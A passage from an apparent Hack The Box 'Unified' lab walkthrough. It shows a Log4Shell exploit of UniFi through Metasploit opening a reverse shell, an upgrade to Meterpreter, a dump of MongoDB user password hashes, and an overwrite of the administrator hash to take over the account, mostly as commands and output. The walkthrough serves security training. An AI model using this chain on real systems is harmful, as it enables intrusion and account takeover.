+</span></span></code></pre></div><p>Since it appears to be vulnerable, we <strong>run</strong> our <strong>exploit</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>[</span>msf<span class=o>](</span>Jobs:0 Agents:0<span class=o>)</span> exploit<span class=o>(</span>multi/http/ubiquiti_unifi_log4shell<span class=o>)</span> &gt;&gt; run
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Started reverse TCP handler on 10.10.14.41:4444 
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Running automatic check <span class=o>(</span><span class=s2>&#34;set AutoCheck false&#34;</span> to disable<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> The target is vulnerable.
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Delivering the serialized Java object to execute the payload...
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Command shell session <span class=m>1</span> opened <span class=o>(</span>10.10.14.41:4444 -&gt; 10.129.157.249:45428<span class=o>)</span> at 2023-05-21 19:03:48 +0100
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Server stopped.
+</span></span></code></pre></div><p>Once the <strong>appropriate</strong> <strong>payload</strong> is sent, we will receive a <strong>reverse shell</strong> on the specified port(in our case 4444) in an other <strong>session</strong>.</p><p>Our next goal is to <strong>upgrade</strong> this <strong>connection</strong> to a <strong>meterpreter shell</strong>. To do this, first we <strong>background</strong> our current session with (ctrl+z),</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Server stopped.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>^Z
+</span></span><span class=line><span class=cl>Background session 1? <span class=o>[</span>y/N<span class=o>]</span>  y
+</span></span><span class=line><span class=cl><span class=o>[</span>msf<span class=o>](</span>Jobs:0 Agents:1<span class=o>)</span> exploit<span class=o>(</span>multi/http/ubiquiti_unifi_log4shell<span class=o>)</span> &gt;&gt;
+</span></span></code></pre></div><p>then we use the - <em>post/multi/manage/shell_to_meterpreter</em> - msf module on that same session.</p><p>If we <strong>break</strong> it <strong>down</strong>, it could look like this:</p><ol><li>Searching for the module.</li></ol><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>[</span>msf<span class=o>](</span>Jobs:0 Agents:1<span class=o>)</span> exploit<span class=o>(</span>multi/http/ubiquiti_unifi_log4shell<span class=o>)</span> &gt;&gt; search shell_to_meterpreter
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Matching <span class=nv>Modules</span>
+</span></span><span class=line><span class=cl><span class=o>================</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>   <span class=c1>#  Name                                    Disclosure Date  Rank    Check  Description</span>
+</span></span><span class=line><span class=cl>   -  ----                                    ---------------  ----    -----  -----------
+</span></span><span class=line><span class=cl>   <span class=m>0</span>  post/multi/manage/shell_to_meterpreter                   normal  No     Shell to Meterpreter Upgrade
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Interact with a module by name or index. For example info 0, use <span class=m>0</span> or use post/multi/manage/shell_to_meterpreter
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>[</span>msf<span class=o>](</span>Jobs:0 Agents:1<span class=o>)</span> exploit<span class=o>(</span>multi/http/ubiquiti_unifi_log4shell<span class=o>)</span> &gt;&gt;
+</span></span></code></pre></div><ol start=2><li>Selecting the module.</li></ol><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>[</span>msf<span class=o>](</span>Jobs:0 Agents:1<span class=o>)</span> exploit<span class=o>(</span>multi/http/ubiquiti_unifi_log4shell<span class=o>)</span> &gt;&gt; use <span class=m>0</span>
+</span></span></code></pre></div><ol start=3><li>Listing all active sessions.</li></ol><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>[</span>msf<span class=o>](</span>Jobs:0 Agents:1<span class=o>)</span> post<span class=o>(</span>multi/manage/shell_to_meterpreter<span class=o>)</span> &gt;&gt; sessions -l
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Active <span class=nv>sessions</span>
+</span></span><span class=line><span class=cl><span class=o>===============</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  Id  Name  Type            Information  Connection
+</span></span><span class=line><span class=cl>  --  ----  ----            -----------  ----------
+</span></span><span class=line><span class=cl>  <span class=m>1</span>         shell cmd/unix               10.10.14.41:4444 -&gt; 10.129.157.249:45428 <span class=o>(</span>10.129.15
+</span></span><span class=line><span class=cl>                                         7.249<span class=o>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>[</span>msf<span class=o>](</span>Jobs:0 Agents:1<span class=o>)</span> post<span class=o>(</span>multi/manage/shell_to_meterpreter<span class=o>)</span> &gt;&gt;
+</span></span></code></pre></div><ol start=4><li>Configuring the module settings.</li></ol><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>[</span>msf<span class=o>](</span>Jobs:0 Agents:1<span class=o>)</span> post<span class=o>(</span>multi/manage/shell_to_meterpreter<span class=o>)</span> &gt;&gt; show options
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Module options <span class=o>(</span>post/multi/manage/shell_to_meterpreter<span class=o>)</span>:
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>   Name     Current Setting  Required  Description
+</span></span><span class=line><span class=cl>   ----     ---------------  --------  -----------
+</span></span><span class=line><span class=cl>   HANDLER  <span class=nb>true</span>             yes       Start an exploit/multi/handler to receive the connect
+</span></span><span class=line><span class=cl>                                       ion
+</span></span><span class=line><span class=cl>   LHOST                     no        IP of host that will receive the connection from the
+</span></span><span class=line><span class=cl>                                       payload <span class=o>(</span>Will try to auto detect<span class=o>)</span>.
+</span></span><span class=line><span class=cl>   LPORT    <span class=m>4433</span>             yes       Port <span class=k>for</span> payload to connect to.
+</span></span><span class=line><span class=cl>   SESSION                   yes       The session to run this module on
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>View the full module info with the info, or info -d command.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>[</span>msf<span class=o>](</span>Jobs:0 Agents:1<span class=o>)</span> post<span class=o>(</span>multi/manage/shell_to_meterpreter<span class=o>)</span> &gt;&gt; <span class=nb>set</span> session <span class=m>1</span>
+</span></span><span class=line><span class=cl><span class=nv>session</span> <span class=o>=</span>&gt; <span class=m>1</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>msf<span class=o>](</span>Jobs:0 Agents:1<span class=o>)</span> post<span class=o>(</span>multi/manage/shell_to_meterpreter<span class=o>)</span> &gt;&gt;
+</span></span></code></pre></div><ol start=5><li>Running the module.</li></ol><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>[</span>msf<span class=o>](</span>Jobs:0 Agents:1<span class=o>)</span> post<span class=o>(</span>multi/manage/shell_to_meterpreter<span class=o>)</span> &gt;&gt; run
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Upgrading session ID: <span class=m>1</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Starting exploit/multi/handler
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Started reverse TCP handler on 10.10.14.41:4433 
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Sending stage <span class=o>(</span><span class=m>1017704</span> bytes<span class=o>)</span> to 10.129.157.249
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Meterpreter session <span class=m>2</span> opened <span class=o>(</span>10.10.14.41:4433 -&gt; 10.129.157.249:54458<span class=o>)</span> at 2023-05-21 19:05:38 +0100
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Command stager progress: 100.00% <span class=o>(</span>773/773 bytes<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Post module execution completed
+</span></span><span class=line><span class=cl><span class=o>[</span>msf<span class=o>](</span>Jobs:0 Agents:2<span class=o>)</span> post<span class=o>(</span>multi/manage/shell_to_meterpreter<span class=o>)</span> &gt;&gt;
+</span></span></code></pre></div><ol start=6><li>Moving to the upgraded shell.</li></ol><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>[</span>msf<span class=o>](</span>Jobs:0 Agents:2<span class=o>)</span> post<span class=o>(</span>multi/manage/shell_to_meterpreter<span class=o>)</span> &gt;&gt; sessions -l
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Active <span class=nv>sessions</span>
+</span></span><span class=line><span class=cl><span class=o>===============</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  Id  Name  Type                   Information             Connection
+</span></span><span class=line><span class=cl>  --  ----  ----                   -----------             ----------
+</span></span><span class=line><span class=cl>  <span class=m>1</span>         shell cmd/unix                                 10.10.14.41:4444 -&gt; 10.129.157.24
+</span></span><span class=line><span class=cl>                                                           9:45428 <span class=o>(</span>10.129.157.249<span class=o>)</span>
+</span></span><span class=line><span class=cl>  <span class=m>2</span>         meterpreter x86/linux  unifi @ 10.129.157.249  10.10.14.41:4433 -&gt; 10.129.157.24
+</span></span><span class=line><span class=cl>                                                           9:54458 <span class=o>(</span>10.129.157.249<span class=o>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>[</span>msf<span class=o>](</span>Jobs:0 Agents:2<span class=o>)</span> post<span class=o>(</span>multi/manage/shell_to_meterpreter<span class=o>)</span> &gt;&gt; sessions -i <span class=m>2</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Starting interaction with 2...
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>(</span>Meterpreter 2<span class=o>)(</span>/usr/lib/unifi<span class=o>)</span> &gt; 
+</span></span></code></pre></div><p>Finally, we use our new shell connection to <strong>grab</strong> the <strong>user flag</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>(</span>Meterpreter 2<span class=o>)(</span>/usr/lib/unifi<span class=o>)</span> &gt; <span class=nb>pwd</span>
+</span></span><span class=line><span class=cl>/usr/lib/unifi
+</span></span><span class=line><span class=cl><span class=o>(</span>Meterpreter 2<span class=o>)(</span>/usr/lib/unifi<span class=o>)</span> &gt; <span class=nb>cd</span> /home/michael/
+</span></span><span class=line><span class=cl><span class=o>(</span>Meterpreter 2<span class=o>)(</span>/home/michael<span class=o>)</span> &gt; ls
+</span></span><span class=line><span class=cl>Listing: /home/michael
+</span></span><span class=line><span class=cl><span class=o>======================</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Mode              Size  Type  Last modified              Name
+</span></span><span class=line><span class=cl>----              ----  ----  -------------              ----
+</span></span><span class=line><span class=cl>020666/rw-rw-rw-  <span class=m>0</span>     cha   2023-05-21 18:17:12 +0100  .bash_history
+</span></span><span class=line><span class=cl>100644/rw-r--r--  <span class=m>220</span>   fil   2021-12-30 22:03:42 +0000  .bash_logout
+</span></span><span class=line><span class=cl>100644/rw-r--r--  <span class=m>3771</span>  fil   2021-12-30 22:03:42 +0000  .bashrc
+</span></span><span class=line><span class=cl>100644/rw-r--r--  <span class=m>807</span>   fil   2021-12-30 22:03:42 +0000  .profile
+</span></span><span class=line><span class=cl>040700/rwx------  <span class=m>4096</span>  dir   2022-01-02 06:17:56 +0000  .ssh
+</span></span><span class=line><span class=cl>100644/rw-r--r--  <span class=m>33</span>    fil   2021-12-30 22:04:33 +0000  user.txt
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>(</span>Meterpreter 2<span class=o>)(</span>/home/michael<span class=o>)</span> &gt; cat user.txt 
+</span></span><span class=line><span class=cl>&lt;flag&gt;
+</span></span><span class=line><span class=cl><span class=o>(</span>Meterpreter 2<span class=o>)(</span>/home/michael<span class=o>)</span> &gt;
+</span></span></code></pre></div><p>Now it&rsquo;s time to <strong>look for</strong> the aforementioned <strong>mongodb</strong> service. For this we change our shell to the target system&rsquo;s <strong>native</strong> <strong>shell</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>(</span>Meterpreter 2<span class=o>)(</span>/home/michael<span class=o>)</span> &gt; shell
+</span></span><span class=line><span class=cl>Process <span class=m>1609</span> created.
+</span></span><span class=line><span class=cl>Channel <span class=m>2</span> created.
+</span></span><span class=line><span class=cl>ls -hla
+</span></span><span class=line><span class=cl>total 28K
+</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>3</span> <span class=m>1000</span> <span class=m>1000</span> 4.0K Jan  <span class=m>2</span>  <span class=m>2022</span> .
+</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>1</span> root root 4.0K May <span class=m>21</span> 17:17 ..
+</span></span><span class=line><span class=cl>lrwxrwxrwx <span class=m>1</span> <span class=m>1000</span> <span class=m>1000</span>    <span class=m>9</span> Dec <span class=m>31</span>  <span class=m>2021</span> .bash_history -&gt; /dev/null
+</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> <span class=m>1000</span> <span class=m>1000</span>  <span class=m>220</span> Dec <span class=m>30</span>  <span class=m>2021</span> .bash_logout
+</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> <span class=m>1000</span> <span class=m>1000</span> 3.7K Dec <span class=m>30</span>  <span class=m>2021</span> .bashrc
+</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> <span class=m>1000</span> <span class=m>1000</span>  <span class=m>807</span> Dec <span class=m>30</span>  <span class=m>2021</span> .profile
+</span></span><span class=line><span class=cl>drwx------ <span class=m>2</span> <span class=m>1000</span> <span class=m>1000</span> 4.0K Jan  <span class=m>2</span>  <span class=m>2022</span> .ssh
+</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> root <span class=m>1000</span>   <span class=m>33</span> Dec <span class=m>30</span>  <span class=m>2021</span> user.txt
+</span></span></code></pre></div><p>Then we use <em><strong>ps</strong></em> with <em><strong>grep</strong></em> to list the <strong>current processes</strong> which mention the word <em>mongo</em>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ps <span class=p>|</span> grep mongo
+</span></span><span class=line><span class=cl>     <span class=m>67</span> ?        00:00:15 mongod
+</span></span><span class=line><span class=cl>ps aux <span class=p>|</span> grep mongo
+</span></span><span class=line><span class=cl>unifi         <span class=m>67</span>  0.4  4.1 <span class=m>1103744</span> <span class=m>85144</span> ?       Sl   17:17   0:15 bin/mongod --dbpath /usr/lib/unifi/data/db --port <span class=m>27117</span> --unixSocketPrefix /usr/lib/unifi/run --logRotate reopen --logappend --logpath /usr/lib/unifi/logs/mongod.log --pidfilepath /usr/lib/unifi/run/mongod.pid --bind_ip 127.0.0.1
+</span></span><span class=line><span class=cl>unifi       <span class=m>1668</span>  0.0  0.0  <span class=m>11468</span>   <span class=m>996</span> ?        S    18:12   0:00 grep mongo
+</span></span></code></pre></div><blockquote><p>27117</p></blockquote><h2 id=task-9><strong>TASK 9</strong><a hidden class=anchor aria-hidden=true href=#task-9>#</a></h2><p><strong>Question</strong>: <em>What is the default database name for UniFi applications?</em></p><p>A simple <strong>online search</strong> should get us this answer. Otherwise, the very nice article referenced in TASK7 also mentions it.</p><blockquote><p>ace</p></blockquote><h2 id=task-10><strong>TASK 10</strong><a hidden class=anchor aria-hidden=true href=#task-10>#</a></h2><p><strong>Question</strong>: <em>What is the function we use to enumerate users within the database in MongoDB?</em></p><p>Enumerating the <em>ace</em> <strong>database</strong> (from TASK9) produces quite a lengthy output, therefore, only a shorter and snipped version is shown here.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>mongo --port <span class=m>27117</span> ace --eval <span class=s2>&#34;db.admin.find().forEach(printjson);&#34;</span>
+</span></span><span class=line><span class=cl>MongoDB shell version v3.6.3
+</span></span><span class=line><span class=cl>connecting to: mongodb://127.0.0.1:27117/ace
+</span></span><span class=line><span class=cl>MongoDB server version: 3.6.3
+</span></span><span class=line><span class=cl><span class=o>{</span>
+</span></span><span class=line><span class=cl>	<span class=s2>&#34;_id&#34;</span> : ObjectId<span class=o>(</span><span class=s2>&#34;61ce278f46e0fb0012d47ee4&#34;</span><span class=o>)</span>,
+</span></span><span class=line><span class=cl>	<span class=s2>&#34;name&#34;</span> : <span class=s2>&#34;administrator&#34;</span>,
+</span></span><span class=line><span class=cl>	<span class=s2>&#34;email&#34;</span> : <span class=s2>&#34;administrator@unified.htb&#34;</span>,
+</span></span><span class=line><span class=cl>	<span class=s2>&#34;x_shadow&#34;</span> : <span class=s2>&#34;</span><span class=nv>$6$Ry6Vdbse$8</span><span class=s2>enMR5Znxoo.WfCMd/Xk65GwuQEPx1M.QP8/qHiQV0PvUc3uHuonK4WcTQFN1CRk3GwQaquyVwCVq8iQgPTt4.&#34;</span>,
+</span></span><span class=line><span class=cl>	<span class=s2>&#34;time_created&#34;</span> : NumberLong<span class=o>(</span>1640900495<span class=o>)</span>,
+</span></span><span class=line><span class=cl>	<span class=s2>&#34;last_site_name&#34;</span> : <span class=s2>&#34;default&#34;</span>,
+</span></span><span class=line><span class=cl>	
+</span></span><span class=line><span class=cl>...
+</span></span><span class=line><span class=cl>...
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>{</span>
+</span></span><span class=line><span class=cl>	<span class=s2>&#34;_id&#34;</span> : ObjectId<span class=o>(</span><span class=s2>&#34;61ce4a63fbce5e00116f424f&#34;</span><span class=o>)</span>,
+</span></span><span class=line><span class=cl>	<span class=s2>&#34;email&#34;</span> : <span class=s2>&#34;michael@unified.htb&#34;</span>,
+</span></span><span class=line><span class=cl>	<span class=s2>&#34;name&#34;</span> : <span class=s2>&#34;michael&#34;</span>,
+</span></span><span class=line><span class=cl>	<span class=s2>&#34;x_shadow&#34;</span> : <span class=s2>&#34;</span><span class=nv>$6$spHwHYVF$mF</span><span class=s2>/VQrMNGSau0IP7LjqQMfF5VjZBph6VUf4clW3SULqBjDNQwW.BlIqsafYbLWmKRhfWTiZLjhSP.D/M1h5yJ0&#34;</span>,
+</span></span><span class=line><span class=cl>	<span class=s2>&#34;requires_new_password&#34;</span> : false,
+</span></span><span class=line><span class=cl>	<span class=s2>&#34;time_created&#34;</span> : NumberLong<span class=o>(</span>1640909411<span class=o>)</span>,
+</span></span><span class=line><span class=cl>	<span class=s2>&#34;last_site_name&#34;</span> : <span class=s2>&#34;default&#34;</span>,
+</span></span><span class=line><span class=cl>	<span class=s2>&#34;email_alert_enabled&#34;</span> : false,
+</span></span><span class=line><span class=cl>	<span class=s2>&#34;email_alert_grouping_enabled&#34;</span> : false,
+</span></span><span class=line><span class=cl>	<span class=s2>&#34;email_alert_grouping_delay&#34;</span> : 60,
+</span></span><span class=line><span class=cl>	<span class=s2>&#34;push_alert_enabled&#34;</span> : <span class=nb>false</span>
+</span></span><span class=line><span class=cl><span class=o>}</span>
+</span></span><span class=line><span class=cl><span class=o>{</span>
+</span></span><span class=line><span class=cl>	<span class=s2>&#34;_id&#34;</span> : ObjectId<span class=o>(</span><span class=s2>&#34;61ce4ce8fbce5e00116f4251&#34;</span><span class=o>)</span>,
+</span></span><span class=line><span class=cl>	<span class=s2>&#34;email&#34;</span> : <span class=s2>&#34;seamus@unified.htb&#34;</span>,
+</span></span><span class=line><span class=cl>	<span class=s2>&#34;name&#34;</span> : <span class=s2>&#34;Seamus&#34;</span>,
+</span></span><span class=line><span class=cl>	<span class=s2>&#34;x_shadow&#34;</span> : <span class=s2>&#34;</span><span class=nv>$6$NT</span><span class=s2>.hcX..</span><span class=nv>$aFei35dMy7Ddn</span><span class=s2>.O.UFybjrAaRR5UfzzChhIeCs0lp1mmXhVHol6feKv4hj8LaGe0dTiyvq1tmA.j9.kfDP.xC.&#34;</span>,
+</span></span><span class=line><span class=cl>	<span class=s2>&#34;requires_new_password&#34;</span> : true,
+</span></span><span class=line><span class=cl>	<span class=s2>&#34;time_created&#34;</span> : NumberLong<span class=o>(</span>1640910056<span class=o>)</span>,
+</span></span><span class=line><span class=cl>	<span class=s2>&#34;last_site_name&#34;</span> : <span class=s2>&#34;default&#34;</span>
+</span></span><span class=line><span class=cl><span class=o>}</span>
+</span></span><span class=line><span class=cl><span class=o>{</span>
+</span></span><span class=line><span class=cl>	<span class=s2>&#34;_id&#34;</span> : ObjectId<span class=o>(</span><span class=s2>&#34;61ce4d27fbce5e00116f4252&#34;</span><span class=o>)</span>,
+</span></span><span class=line><span class=cl>	<span class=s2>&#34;email&#34;</span> : <span class=s2>&#34;warren@unified.htb&#34;</span>,
+</span></span><span class=line><span class=cl>	<span class=s2>&#34;name&#34;</span> : <span class=s2>&#34;warren&#34;</span>,
+</span></span><span class=line><span class=cl>	<span class=s2>&#34;x_shadow&#34;</span> : <span class=s2>&#34;</span><span class=nv>$6$DDOzp</span><span class=s2>/8g</span><span class=nv>$VXE2i</span><span class=s2>.FgQSRJvTu.8G4jtxhJ8gm22FuCoQbAhhyLFCMcwX95ybr4dCJR/Otas100PZA9fHWgTpWYzth5KcaCZ.&#34;</span>,
+</span></span><span class=line><span class=cl>	<span class=s2>&#34;requires_new_password&#34;</span> : true,
+</span></span><span class=line><span class=cl>	<span class=s2>&#34;time_created&#34;</span> : NumberLong<span class=o>(</span>1640910119<span class=o>)</span>,
+</span></span><span class=line><span class=cl>	<span class=s2>&#34;last_site_name&#34;</span> : <span class=s2>&#34;default&#34;</span>
+</span></span><span class=line><span class=cl><span class=o>}</span>
+</span></span><span class=line><span class=cl><span class=o>{</span>
+</span></span><span class=line><span class=cl>	<span class=s2>&#34;_id&#34;</span> : ObjectId<span class=o>(</span><span class=s2>&#34;61ce4d51fbce5e00116f4253&#34;</span><span class=o>)</span>,
+</span></span><span class=line><span class=cl>	<span class=s2>&#34;email&#34;</span> : <span class=s2>&#34;james@unfiied.htb&#34;</span>,
+</span></span><span class=line><span class=cl>	<span class=s2>&#34;name&#34;</span> : <span class=s2>&#34;james&#34;</span>,
+</span></span><span class=line><span class=cl>	<span class=s2>&#34;x_shadow&#34;</span> : <span class=s2>&#34;</span><span class=nv>$6$ON</span><span class=s2>/tM.23</span><span class=nv>$cp3j11TkOCDVdy</span><span class=s2>/DzOtpEbRC5mqbi1PPUM6N4ao3Bog8rO.ZGqn6Xysm3v0bKtyclltYmYvbXLhNybGyjvAey1&#34;</span>,
+</span></span><span class=line><span class=cl>	<span class=s2>&#34;requires_new_password&#34;</span> : false,
+</span></span><span class=line><span class=cl>	<span class=s2>&#34;time_created&#34;</span> : NumberLong<span class=o>(</span>1640910161<span class=o>)</span>,
+</span></span><span class=line><span class=cl>	<span class=s2>&#34;last_site_name&#34;</span> : <span class=s2>&#34;default&#34;</span>
+</span></span><span class=line><span class=cl><span class=o>}</span>
+</span></span></code></pre></div><blockquote><p>db.admin.find()</p></blockquote><h2 id=task-11><strong>TASK 11</strong><a hidden class=anchor aria-hidden=true href=#task-11>#</a></h2><p><strong>Question</strong>: <em>What is the function we use to update users within the database in MongoDB?</em></p><p>Our main idea for <strong>privilege escalation</strong> is to simply swap the <em>admin's</em> <strong>password&rsquo;s hash</strong> - which is stored in the <strong>mongo database</strong> - to an arbitrary one, which we control.</p><p>Therefore, we must first <strong>generate</strong> this <strong>password hash</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.41<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-8iyjpno6j2<span class=o>]</span>─<span class=o>[</span>~/Desktop<span class=o>]</span>
+</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ mkpasswd -m sha-512 password
+</span></span><span class=line><span class=cl><span class=nv>$6$BSx5wsP</span>/AYQd0ukF<span class=nv>$9</span>VyddeMmsdJ9EPbQ/4lKRv8gCKp7e8Qca5.hd6bgLN2ePkonNnn56s0hDKOV.pLsPCVwm5fPzeS5XehlO2NhE.
+</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.41<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-8iyjpno6j2<span class=o>]</span>─<span class=o>[</span>~/Desktop<span class=o>]</span>
+</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$
+</span></span></code></pre></div><p>Then we <strong>overwrite</strong> the stored one (in mongodb) with this one.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>mongo --port <span class=m>27117</span> ace --eval <span class=s1>&#39;db.admin.update({&#34;_id&#34;:
+</span></span></span><span class=line><span class=cl><span class=s1>ObjectId(&#34;61ce278f46e0fb0012d47ee4&#34;)},{$set:{&#34;x_shadow&#34;:&#34;$6$BSx5wsP/AYQd0ukF$9VyddeMmsdJ9EPbQ/4lKRv8gCKp7e8Qca5.hd6bgLN2ePkonNnn56s0hDKOV.pLsPCVwm5fPzeS5XehlO2NhE.&#34;}})&#39;</span>
+</span></span><span class=line><span class=cl>MongoDB shell version v3.6.3
+</span></span><span class=line><span class=cl>connecting to: mongodb://127.0.0.1:27117/ace
+</span></span><span class=line><span class=cl>MongoDB server version: 3.6.3
+</span></span><span class=line><span class=cl>WriteResult<span class=o>({</span> <span class=s2>&#34;nMatched&#34;</span> : 1, <span class=s2>&#34;nUpserted&#34;</span> : 0, <span class=s2>&#34;nModified&#34;</span> : <span class=m>1</span> <span class=o>})</span>
+</span></span></code></pre></div><p>Lastly, we <strong>verify</strong> the <strong>swap</strong> and <strong>close</strong> the open <strong>sessions</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>mongo --port <span class=m>27117</span> ace --eval <span class=s2>&#34;db.admin.find().forEach(printjson);&#34;</span>
+</span></span><span class=line><span class=cl>MongoDB shell version v3.6.3
+</span></span><span class=line><span class=cl>connecting to: mongodb://127.0.0.1:27117/ace
+</span></span><span class=line><span class=cl>MongoDB server version: 3.6.3
+</span></span><span class=line><span class=cl><span class=o>{</span>
+</span></span><span class=line><span class=cl>	<span class=s2>&#34;_id&#34;</span> : ObjectId<span class=o>(</span><span class=s2>&#34;61ce278f46e0fb0012d47ee4&#34;</span><span class=o>)</span>,
+</span></span><span class=line><span class=cl>	<span class=s2>&#34;name&#34;</span> : <span class=s2>&#34;administrator&#34;</span>,
+</span></span><span class=line><span class=cl>	<span class=s2>&#34;email&#34;</span> : <span class=s2>&#34;administrator@unified.htb&#34;</span>,
+</span></span><span class=line><span class=cl>	<span class=s2>&#34;x_shadow&#34;</span> : <span class=s2>&#34;</span><span class=nv>$6$BSx5wsP</span><span class=s2>/AYQd0ukF</span><span class=nv>$9</span><span class=s2>VyddeMmsdJ9EPbQ/4lKRv8gCKp7e8Qca5.hd6bgLN2ePkonNnn56s0hDKOV.pLsPCVwm5fPzeS5XehlO2NhE.&#34;</span>,
+</span></span><span class=line><span class=cl>	<span class=s2>&#34;time_created&#34;</span> : NumberLong<span class=o>(</span>1640900495<span class=o>)</span>,
+</span></span><span class=line><span class=cl>	<span class=s2>&#34;last_site_name&#34;</span> : <span class=s2>&#34;default&#34;</span>,
+</span></span><span class=line><span class=cl>...
+</span></span><span class=line><span class=cl>...
+</span></span><span class=line><span class=cl><span class=nb>exit</span>
+</span></span><span class=line><span class=cl><span class=o>(</span>Meterpreter 2<span class=o>)(</span>/home/michael<span class=o>)</span> &gt; <span class=nb>exit</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Shutting down Meterpreter...
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> 10.129.157.249 - Meterpreter session <span class=m>2</span> closed.  Reason: User <span class=nb>exit</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>msf<span class=o>](</span>Jobs:0 Agents:1<span class=o>)</span> post<span class=o>(</span>multi/manage/shell_to_meterpreter<span class=o>)</span> &gt;&gt; <span class=nb>exit</span> -y
+</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.41<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-8iyjpno6j2<span class=o>]</span>─<span class=o>[</span>~/unified<span class=o>]</span>
+</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ 
